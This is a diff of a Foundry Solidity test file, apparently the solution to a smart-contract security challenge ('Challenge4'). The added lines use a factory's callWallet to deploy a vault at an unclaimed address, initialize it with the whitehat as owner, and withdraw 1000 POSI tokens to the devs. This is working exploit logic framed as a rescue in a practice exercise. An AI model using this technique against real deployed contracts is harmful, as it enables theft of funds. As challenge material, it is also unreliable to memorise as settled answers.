@@ -46,9 +46,28 @@ contract Challenge4Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge4Test -vvvv //
         ////////////////////////////////////////////////////*/
+        FACTORY.callWallet(
+            address(FACTORY),
+            abi.encodeWithSignature(
+                "deploy(bytes,uint256)",
+                type(VaultWalletTemplate).creationCode,
+                uint256(11) 
+            )
+        );
+        FACTORY.callWallet(
+            unclaimedAddress,
+            abi.encodeWithSignature("initialize(address)", whitehat)
+        );
+        unclaimedAddress.call(
+            abi.encodeWithSignature("withdrawERC20(address,uint256,address)", address(POSI), 1000 ether, devs)
+        );
 
-
-
+        /* bytes memory bytecode = type(VaultWalletTemplate).creationCode;
+        VaultWalletTemplate vault = VaultWalletTemplate(payable(FACTORY.deploy(bytecode, 11)));
+        vault.initialize(whitehat);
+        vault.withdrawERC20(address(POSI), POSI.balanceOf(address(vault)), devs); */
+        
+        console.log("FACTORY address: %s", address(FACTORY));
 
         //==================================================//
         vm.stopPrank();
